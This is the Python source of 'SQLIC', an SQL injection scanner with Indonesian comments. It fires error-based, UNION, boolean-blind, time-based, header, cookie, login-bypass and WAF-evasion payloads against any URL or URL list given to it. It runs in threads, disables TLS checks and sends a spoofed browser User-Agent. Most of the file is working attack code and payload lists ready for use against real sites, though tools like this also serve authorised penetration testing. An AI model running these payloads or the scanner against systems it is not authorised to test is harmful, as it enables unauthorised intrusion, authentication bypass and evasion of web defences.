#!/usr/bin/env python3
"""
SQLIC - SQL Injection Scanner
Deteksi kerentanan SQL Injection pada target URL.

Teknik yang diuji:
  1. Error-Based   — trigger SQL error, detect via error signatures
  2. Union-Based   — inject UNION SELECT, detect extra data in response
  3. Boolean-Blind — compare true/false condition response differences
  4. Time-Based    — inject SLEEP/WAITFOR, measure response delay
  5. Header-Based  — inject via X-Forwarded-For, User-Agent, Referer
  6. Cookie-Based  — inject via cookie values
  7. Auth Bypass   — login form bypass via classic payloads

DBMS Support: MySQL, PostgreSQL, MSSQL, Oracle
"""
import argparse
import json
import re
import sys
import time
import threading
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import httpx
except ImportError:
    print("[!] httpx not found. Install: pip install httpx")
    sys.exit(1)

# ──────────────────────────────────────────────
# COLORS
# ──────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

def banner() -> None:
    print(f"""{C.CYAN}{C.BOLD}
  ___  ___  _    _  ___
 / __|/ _ \\| |  (_)/ __|
 \\__ \\ (_) | |__ | | (__
 |___/\\__\\_\\____|_|\\___|
{C.RESET}{C.DIM}  SQL Injection Scanner v1.5{C.RESET}
""")

# ──────────────────────────────────────────────
# PAYLOADS
# ──────────────────────────────────────────────
PAYLOADS: dict[str, dict | list] = {
    "error_based": {
        "mysql": [
            "'",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
            "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
            "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ],
        "postgresql": [
            "'",
            "' AND CAST(version() AS int)--",
            "' AND 1=CAST((SELECT version()) AS int)--",
        ],
        "mssql": [
            "'",
            "' AND 1=CONVERT(int,@@version)--",
            "'; SELECT @@version--",
        ],
        "oracle": [
            "'",
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        ],
    },
    "union_based": [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    ],
    "boolean_blind": [
        ("' AND '1'='1'-- -",   "' AND '1'='2'-- -"),
        ("' AND 1=1-- -",       "' AND 1=2-- -"),
        ("' OR '1'='1'-- -",    "' OR '1'='2'-- -"),
        ("1 AND 1=1",           "1 AND 1=2"),
    ],
    "time_based": {
        "mysql":      ("' AND SLEEP({delay})-- -",                    "SLEEP"),
        "postgresql": ("'; SELECT pg_sleep({delay})-- -",             "pg_sleep"),
        "mssql":      ("'; WAITFOR DELAY '00:00:0{delay}'-- -",      "WAITFOR"),
    },
    "auth_bypass": [
        "' OR 1=1-- -",
        "admin'-- -",
        "' OR '1'='1'-- -",
        "admin') OR ('1'='1'-- -",
        "' OR 1=1#",
    ],
    "header_injection": [
        "'",
        "' OR '1'='1",
        "1' AND SLEEP(3)-- -",
    ],
    "waf_bypass": [
        "' UnIoN SeLeCt NULL-- -",
        "' UN/**/ION SE/**/LECT NULL-- -",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL-- -",
        "' AND/*!*/1=1-- -",
    ],
}

# SQL error signatures per DBMS
ERROR_SIGNATURES: dict[str, list[str]] = {
    "mysql": [
        r"SQL syntax.*?MySQL",
        r"Warning.*?\bmysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
    ],
    "postgresql": [
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\bpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "mssql": [
        r"Driver.*?SQL[\-\_\ ]*Server",
        r"OLE DB.*?SQL Server",
        r"\bSQL Server\b",
        r"ODBC.*?Driver",
        r"SQLServer JDBC Driver",
        r"Unclosed quotation mark",
        r"Microsoft OLE DB Provider",
        r"com\.microsoft\.sqlserver\.jdbc",
    ],
    "oracle": [
        r"\bORA-\d{5}\b",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?\boci_",
        r"Warning.*?\bora_",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
    ],
}

# ──────────────────────────────────────────────
# DETECTION HELPERS
# ──────────────────────────────────────────────
def detect_dbms(content: str) -> Optional[str]:
    """Detect DBMS dari error message."""
    for dbms, patterns in ERROR_SIGNATURES.items():
        for pat in patterns:
            if re.search(pat, content, re.IGNORECASE):
                return dbms
    return None

def check_sql_errors(content: str) -> Optional[tuple[str, str]]:
    """Cek apakah response mengandung SQL error. Return (dbms, matched_pattern) atau None."""
    for dbms, patterns in ERROR_SIGNATURES.items():
        for pat in patterns:
            match = re.search(pat, content, re.IGNORECASE)
            if match:
                return dbms, match.group(0)
    return None

def content_diff_ratio(text_a: str, text_b: str) -> float:
    """Hitung perbedaan length antara 2 response sebagai persentase."""
    len_a, len_b = len(text_a), len(text_b)
    if max(len_a, len_b) == 0:
        return 0.0
    return abs(len_a - len_b) / max(len_a, len_b) * 100

def inject_param(url: str, param: str, payload: str, original_value: str = "") -> str:
    """Inject payload ke parameter URL tertentu."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [original_value + payload]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

# ──────────────────────────────────────────────
# HTTP HELPER
# ──────────────────────────────────────────────
def safe_get(
    url: str,
    timeout: int = 10,
    headers: Optional[dict] = None,
    cookies: Optional[dict] = None,
) -> Optional[httpx.Response]:
    """HTTP GET with error handling. Return Response atau None."""
    try:
        with httpx.Client(
            verify=False,
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        ) as client:
            return client.get(url, headers=headers or {}, cookies=cookies or {})
    except Exception:
        return None

# ──────────────────────────────────────────────
# ATTACK MODULES
# ──────────────────────────────────────────────
def test_error_based(
    url: str, param: str, value: str, dbms: str = "mysql"
) -> list[dict]:
    """Test Error-Based SQLi."""
    findings: list[dict] = []
    payloads = PAYLOADS["error_based"].get(dbms, PAYLOADS["error_based"]["mysql"])

    for payload in payloads:
        test_url = inject_param(url, param, payload, value)
        resp = safe_get(test_url)
        if resp is None:
            continue

        error_result = check_sql_errors(resp.text)
        if error_result:
            found_dbms, matched = error_result
            findings.append({
                "type": "Error-Based",
                "severity": "HIGH",
                "param": param,
                "payload": payload,
                "url": test_url,
                "dbms": found_dbms,
                "evidence": matched[:120],
                "status": resp.status_code,
            })
            break  # satu temuan cukup per teknik
        time.sleep(0.2)

    return findings

def test_union_based(url: str, param: str, value: str) -> list[dict]:
    """Test Union-Based SQLi. Cari berapa kolom yang valid."""
    findings: list[dict] = []

    # Baseline
    baseline = safe_get(url)
    if baseline is None:
        return findings
    baseline_len = len(baseline.text)

    for payload in PAYLOADS["union_based"]:
        test_url = inject_param(url, param, payload, value)
        resp = safe_get(test_url)
        if resp is None:
            continue

        # Cek error = wrong column count (good sign, means union works partially)
        if re.search(r"(column|columns|select list|number of columns)", resp.text, re.IGNORECASE):
            continue  # coba kolom berikutnya

        # Cek apakah response berubah signifikan TANPA SQL error
        error_result = check_sql_errors(resp.text)
        if error_result:
            continue  # ini error-based, bukan union

        # Cek apakah NULL muncul atau response beda signifikan
        diff = content_diff_ratio(baseline.text, resp.text)
        if diff > 10 and len(resp.text) > baseline_len:
            findings.append({
                "type": "Union-Based",
                "severity": "CRITICAL",
                "param": param,
                "payload": payload,
                "url": test_url,
                "evidence": f"Response size changed: {baseline_len} -> {len(resp.text)} ({diff:.1f}% diff)",
                "status": resp.status_code,
            })
            break
        time.sleep(0.2)

    return findings

def test_boolean_blind(
    url: str, param: str, value: str, baseline_len: float, tolerance: float
) -> list[dict]:
    """Test Boolean-Blind SQLi."""
    findings: list[dict] = []

    for true_payload, false_payload in PAYLOADS["boolean_blind"]:
        # True condition
        true_url = inject_param(url, param, true_payload, value)
        true_resp = safe_get(true_url)
        if true_resp is None:
            continue
        true_len = len(true_resp.text)
        time.sleep(0.2)

        # False condition
        false_url = inject_param(url, param, false_payload, value)
        false_resp = safe_get(false_url)
        if false_resp is None:
            continue
        false_len = len(false_resp.text)

        # Hitung perbedaan
        diff = content_diff_ratio(true_resp.text, false_resp.text)

        # Kondisi vuln:
        # 1. True vs False harus beda signifikan (> tolerance)
        # 2. True response harus mirip baseline (artinya true=normal, false=berubah)
        true_vs_baseline = abs(true_len - baseline_len) / max(true_len, 1) * 100
        false_vs_baseline = abs(false_len - baseline_len) / max(false_len, 1) * 100

        if diff > tolerance and true_vs_baseline < false_vs_baseline:
            findings.append({
                "type": "Boolean-Blind",
                "severity": "HIGH",
                "param": param,
                "payload": true_payload,
                "url": true_url,
                "evidence": f"True/False diff: {diff:.1f}% (threshold: {tolerance:.1f}%)",
                "status": true_resp.status_code,
            })
            break
        time.sleep(0.2)

    return findings

def test_time_based(
    url: str, param: str, value: str, baseline_time: float, dbms: str = "mysql"
) -> list[dict]:
    """
    Test Time-Based Blind SQLi.
    Double verification: probe 3s dulu, kalau kena, verify 6s.
    """
    findings: list[dict] = []

    payload_template, _ = PAYLOADS["time_based"].get(dbms, PAYLOADS["time_based"]["mysql"])

    # Probe 1: delay 3 detik
    delay_short = 3
    payload = payload_template.format(delay=delay_short)
    test_url = inject_param(url, param, payload, value)

    start = time.time()
    resp = safe_get(test_url, timeout=delay_short + 10)
    elapsed = time.time() - start

    if resp is None:
        return findings

    observed_delay = elapsed - baseline_time
    if observed_delay < (delay_short - 0.5):
        return findings  # tidak ada delay

    # Probe 2: verify dengan delay 6 detik
    delay_long = 6
    payload_verify = payload_template.format(delay=delay_long)
    verify_url = inject_param(url, param, payload_verify, value)

    start = time.time()
    resp_verify = safe_get(verify_url, timeout=delay_long + 10)
    elapsed_verify = time.time() - start

    if resp_verify is None:
        return findings

    observed_delay_verify = elapsed_verify - baseline_time
    if observed_delay_verify >= (delay_long - 1.0):
        findings.append({
            "type": "Time-Based Blind",
            "severity": "HIGH",
            "param": param,
            "payload": payload,
            "url": test_url,
            "evidence": f"Delay {delay_short}s: {elapsed:.1f}s | Delay {delay_long}s: {elapsed_verify:.1f}s (baseline: {baseline_time:.1f}s)",
            "status": resp.status_code,
        })

    return findings

def test_header_based(url: str) -> list[dict]:
    """Test SQLi via HTTP headers (X-Forwarded-For, User-Agent, Referer)."""
    findings: list[dict] = []
    headers_to_test = ["X-Forwarded-For", "User-Agent", "Referer", "X-Client-IP"]

    for header_name in headers_to_test:
        for payload in PAYLOADS["header_injection"]:
            resp = safe_get(url, headers={header_name: payload})
            if resp is None:
                continue

            error_result = check_sql_errors(resp.text)
            if error_result:
                found_dbms, matched = error_result
                findings.append({
                    "type": "Header-Based",
                    "severity": "HIGH",
                    "param": header_name,
                    "payload": payload,
                    "url": url,
                    "dbms": found_dbms,
                    "evidence": matched[:120],
                    "status": resp.status_code,
                })
                break  # skip payload lain untuk header ini
            time.sleep(0.2)

    return findings

def test_cookie_based(url: str) -> list[dict]:
    """Test SQLi via cookie values."""
    findings: list[dict] = []

    # Ambil cookies dari initial request
    resp = safe_get(url)
    if resp is None or not resp.cookies:
        return findings

    for cookie_name in list(resp.cookies.keys())[:5]:
        for payload in PAYLOADS["header_injection"]:
            test_resp = safe_get(url, cookies={cookie_name: payload})
            if test_resp is None:
                continue

            error_result = check_sql_errors(test_resp.text)
            if error_result:
                found_dbms, matched = error_result
                findings.append({
                    "type": "Cookie-Based",
                    "severity": "HIGH",
                    "param": f"cookie:{cookie_name}",
                    "payload": payload,
                    "url": url,
                    "dbms": found_dbms,
                    "evidence": matched[:120],
                    "status": test_resp.status_code,
                })
                break
            time.sleep(0.2)

    return findings

def test_waf_bypass(url: str, param: str, value: str) -> list[dict]:
    """Test WAF bypass payloads."""
    findings: list[dict] = []

    for payload in PAYLOADS["waf_bypass"]:
        test_url = inject_param(url, param, payload, value)
        resp = safe_get(test_url)
        if resp is None:
            continue

        error_result = check_sql_errors(resp.text)
        if error_result:
            found_dbms, matched = error_result
            findings.append({
                "type": "WAF Bypass",
                "severity": "CRITICAL",
                "param": param,
                "payload": payload,
                "url": test_url,
                "dbms": found_dbms,
                "evidence": matched[:120],
                "status": resp.status_code,
            })
            break
        time.sleep(0.2)

    return findings

# ──────────────────────────────────────────────
# URL SCANNER
# ──────────────────────────────────────────────
def scan_url(url: str, thorough: bool = False) -> dict:
    """
    Scan satu URL untuk semua teknik SQLi.
    Return dict hasil scan.
    """
    parsed = urlparse(url)
    if not parsed.scheme:
        url = f"https://{url}"
        parsed = urlparse(url)

    params = parse_qs(parsed.query, keep_blank_values=True)

    result: dict = {
        "url": url,
        "findings": [],
        "params_tested": list(params.keys()),
        "dbms": None,
        "vulnerable": False,
    }

    all_findings: list[dict] = []

    # ── Header + Cookie tests (gak butuh parameter) ──
    all_findings.extend(test_header_based(url))
    all_findings.extend(test_cookie_based(url))

    if not params:
        result["findings"] = all_findings
        result["vulnerable"] = len(all_findings) > 0
        return result

    # ── Dynamic Baseline ──
    # Ambil 3x request untuk hitung rata-rata & toleransi
    baseline_lengths: list[int] = []
    baseline_times: list[float] = []
    baseline_content = ""

    for _ in range(3):
        start = time.time()
        resp = safe_get(url)
        elapsed = time.time() - start
        if resp:
            baseline_lengths.append(len(resp.text))
            baseline_times.append(elapsed)
            baseline_content = resp.text
        time.sleep(0.2)

    if not baseline_lengths:
        result["findings"] = all_findings
        result["vulnerable"] = len(all_findings) > 0
        return result

    avg_len = sum(baseline_lengths) / len(baseline_lengths)
    avg_time = sum(baseline_times) / len(baseline_times)
    max_diff = max(abs(l - avg_len) for l in baseline_lengths)

    # Toleransi dinamis: minimal 5%, naik kalau web-nya dinamis
    tolerance = max(5.0, (max_diff / max(avg_len, 1)) * 100 * 1.5)

    # Detect DBMS dari baseline
    dbms = detect_dbms(baseline_content) or "mysql"
    result["dbms"] = dbms

    # ── Test setiap parameter ──
    for param in params:
        value = params[param][0] if params[param] else ""

        # Error-Based
        all_findings.extend(test_error_based(url, param, value, dbms))

        # Union-Based
        all_findings.extend(test_union_based(url, param, value))

        # Boolean-Blind
        all_findings.extend(test_boolean_blind(url, param, value, avg_len, tolerance))

        # Time-Based (hanya kalau --thorough, karena lambat)
        if thorough:
            all_findings.extend(test_time_based(url, param, value, avg_time, dbms))

        # WAF Bypass
        all_findings.extend(test_waf_bypass(url, param, value))

    result["findings"] = all_findings
    result["vulnerable"] = len(all_findings) > 0

    # Update DBMS dari findings
    for f in all_findings:
        if f.get("dbms"):
            result["dbms"] = f["dbms"]
            break

    return result

# ──────────────────────────────────────────────
# OUTPUT
# ──────────────────────────────────────────────
_print_lock = threading.Lock()

def print_result(r: dict) -> None:
    with _print_lock:
        url = r["url"]
        findings = r["findings"]

        if r["vulnerable"]:
            tag = f"{C.RED}{C.BOLD}[VULN]{C.RESET}"
        else:
            tag = f"{C.DIM}[SAFE]{C.RESET}"

        print(f"  {tag} {C.BOLD}{url}{C.RESET}")

        if not findings:
            print()
            return

        for f in findings:
            sev = f["severity"]
            sev_color = C.RED if sev in ("HIGH", "CRITICAL") else C.YELLOW if sev == "MEDIUM" else C.DIM

            print(f"        {sev_color}[{sev}]{C.RESET} {C.CYAN}{f['type']}{C.RESET}")
            print(f"              Param   : {C.MAGENTA}{f['param']}{C.RESET}")
            print(f"              Payload : {f['payload'][:80]}")
            if f.get("dbms"):
                print(f"              DBMS    : {C.YELLOW}{f['dbms']}{C.RESET}")
            if f.get("evidence"):
                print(f"              Evidence: {C.DIM}{f['evidence']}{C.RESET}")
            print(f"              Status  : {f.get('status', '-')}")

        print()

def save_results(results: list[dict], outfile: str, elapsed: float) -> None:
    vuln = [r for r in results if r["vulnerable"]]

    # Detect format dari extension
    if outfile.endswith(".json"):
        report = {
            "scan_date": datetime.now().isoformat(),
            "scan_duration": f"{elapsed:.1f}s",
            "total_urls": len(results),
            "total_vulnerable": len(vuln),
            "results": results,
            "summary": _get_summary(results),
        }
        with open(outfile, "w") as f:
            json.dump(report, f, indent=2, default=str)
    else:
        with open(outfile, "w") as f:
            f.write(f"SQLIC Scan Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Scan Duration: {elapsed:.1f}s\n")
            f.write("=" * 60 + "\n\n")

            f.write(f"[SUMMARY]\n")
            f.write(f"  Total URLs   : {len(results)}\n")
            f.write(f"  Vulnerable   : {len(vuln)}\n")
            f.write(f"  Safe         : {len(results) - len(vuln)}\n\n")

            if vuln:
                f.write(f"[VULNERABLE] ({len(vuln)} found)\n")
                f.write("-" * 60 + "\n")
                for r in vuln:
                    f.write(f"\n  URL: {r['url']}\n")
                    if r.get("dbms"):
                        f.write(f"  DBMS: {r['dbms']}\n")
                    for finding in r["findings"]:
                        f.write(f"    [{finding['severity']}] {finding['type']}\n")
                        f.write(f"      Param   : {finding['param']}\n")
                        f.write(f"      Payload : {finding['payload']}\n")
                        if finding.get("evidence"):
                            f.write(f"      Evidence: {finding['evidence']}\n")
                f.write("\n")

            f.write(f"\n[ALL RESULTS]\n")
            f.write("-" * 60 + "\n")
            for r in results:
                status = "VULN" if r["vulnerable"] else "SAFE"
                f.write(f"  [{status}] {r['url']} | Findings: {len(r['findings'])}\n")

    print(f"  {C.GREEN}[+] Report saved to: {outfile}{C.RESET}")

def _get_summary(results: list[dict]) -> dict:
    summary: dict[str, int] = defaultdict(int)
    for r in results:
        for f in r["findings"]:
            summary[f["type"]] += 1
    return dict(summary)

# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
def main() -> None:
    banner()

    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh penggunaan:
  python sqlic.py -u "https://target.com/page?id=1"
  python sqlic.py -l urls.txt -t 5 -o report.json
  python sqlic.py -u "https://target.com/page?id=1" --thorough
  python sqlic.py -u "https://target.com/page?id=1" -o report.txt
        """,
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url",    help="Single URL to scan (harus punya parameter)")
    group.add_argument("-l", "--list",   help="File containing list of URLs")
    parser.add_argument("-o", "--output",   help="Save report to file (.json or .txt)", default=None)
    parser.add_argument("-t", "--threads",  help="Number of threads (default: 3)", type=int, default=3)
    parser.add_argument("--timeout",        help="HTTP timeout in seconds (default: 10)", type=int, default=10)
    parser.add_argument("--thorough",       help="Enable time-based blind tests (slower)", action="store_true")
    args = parser.parse_args()

    # Kumpulkan targets
    targets: list[str] = []
    if args.url:
        targets = [args.url]
    elif args.list:
        try:
            with open(args.list) as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print(f"  {C.RED}[!] File not found: {args.list}{C.RESET}")
            sys.exit(1)

    # Normalize URLs
    normalized: list[str] = []
    for t in targets:
        if not t.startswith("http://") and not t.startswith("https://"):
            t = f"https://{t}"
        normalized.append(t)
    targets = normalized

    if not targets:
        print(f"  {C.RED}[!] No targets provided.{C.RESET}")
        sys.exit(1)

    # Count params
    total_params = 0
    for t in targets:
        total_params += len(parse_qs(urlparse(t).query, keep_blank_values=True))

    tests_desc = "Error, Union, Boolean-Blind, Header, Cookie, WAF-Bypass"
    if args.thorough:
        tests_desc += ", Time-Based"

    print(f"  {C.CYAN}[*] Targets    : {len(targets)}{C.RESET}")
    print(f"  {C.CYAN}[*] Parameters : {total_params}{C.RESET}")
    print(f"  {C.CYAN}[*] Threads    : {args.threads}{C.RESET}")
    print(f"  {C.CYAN}[*] Timeout    : {args.timeout}s{C.RESET}")
    print(f"  {C.CYAN}[*] Mode       : {'Thorough' if args.thorough else 'Fast'}{C.RESET}")
    print(f"  {C.CYAN}[*] Tests      : {tests_desc}{C.RESET}")
    print()

    results: list[dict] = []
    vuln_count = 0
    start_time = time.time()

    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(scan_url, t, args.thorough): t
                for t in targets
            }
            for i, future in enumerate(as_completed(futures), 1):
                try:
                    r = future.result()
                except Exception as exc:
                    target = futures[future]
                    r = {
                        "url": target,
                        "findings": [],
                        "params_tested": [],
                        "dbms": None,
                        "vulnerable": False,
                    }
                results.append(r)
                print_result(r)
                if r["vulnerable"]:
                    vuln_count += 1

                sys.stdout.write(f"\r  {C.DIM}Progress: {i}/{len(targets)}{C.RESET}  ")
                sys.stdout.flush()

    except KeyboardInterrupt:
        print(f"\n\n  {C.YELLOW}[!] Scan dihentikan oleh user (Ctrl+C){C.RESET}")
        print(f"  {C.DIM}    Menampilkan hasil yang sudah terkumpul...{C.RESET}\n")

    elapsed = time.time() - start_time
    safe_count = len(results) - vuln_count
    total_findings = sum(len(r["findings"]) for r in results)

    # ── Summary ──
    print(f"\n\n  {'─'*50}")
    print(f"  {C.BOLD}SCAN COMPLETE{C.RESET}")
    print(f"  {'─'*50}")
    print(f"   Total scanned  : {len(results)}/{len(targets)}")
    print(f"   {C.RED}{C.BOLD}Vulnerable     : {vuln_count}{C.RESET}")
    print(f"   Safe           : {safe_count}")
    print(f"   Total findings : {total_findings}")

    if total_findings > 0:
        summary = _get_summary(results)
        print(f"   {C.DIM}Breakdown:{C.RESET}")
        for vtype, count in sorted(summary.items(), key=lambda x: x[1], reverse=True):
            print(f"     {C.DIM}{vtype}: {count}{C.RESET}")

    print(f"   Duration       : {elapsed:.1f}s")
    print(f"  {'─'*50}")
    print()

    if args.output:
        save_results(results, args.output, elapsed)

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
